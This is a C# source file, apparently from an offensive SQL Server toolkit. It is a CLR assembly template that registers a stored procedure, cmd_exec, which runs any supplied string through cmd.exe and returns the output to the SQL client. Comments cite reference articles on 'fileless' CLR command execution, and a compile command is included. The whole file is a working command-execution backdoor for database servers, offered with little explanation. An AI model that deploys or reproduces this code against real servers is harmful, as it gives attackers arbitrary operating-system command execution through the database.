// CLR assembly template for SQL Server that can execute os commands
// Based on the following online resources:
// - https://msdn.microsoft.com/en-us/library/ff878250.aspx
// - https://msdn.microsoft.com/en-us/library/microsoft.sqlserver.server.sqlpipe.sendresultsrow(v=vs.110).aspx
// - http://sekirkity.com/seeclrly-fileless-sql-server-clr-based-custom-stored-procedure-command-execution/
// Compile example: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library c:\temp\cmd_exec.cs

using System;
using System.Data;
using System.Data.SqlClient;
using System.Data.SqlTypes;
using Microsoft.SqlServer.Server;
using System.IO;
using System.Diagnostics;
using System.Text;

public partial class StoredProcedures
{
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void cmd_exec (SqlString execCommand)
    {
        Process proc = new Process();
        proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
        proc.StartInfo.Arguments = string.Format(@" /C {0}", execCommand.Value);
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.Start();

        // Create the record and specify the metadata for the columns.
	      SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", SqlDbType.NVarChar, 4000));

	      // Mark the begining of the result-set.
	      SqlContext.Pipe.SendResultsStart(record);

        // Set values for each column in the row
	      record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());

        // Send the row back to the client.
	      SqlContext.Pipe.SendResultsRow(record);

        // Mark the end of the result-set.
        SqlContext.Pipe.SendResultsEnd();

        proc.WaitForExit();
        proc.Close();
    }
};
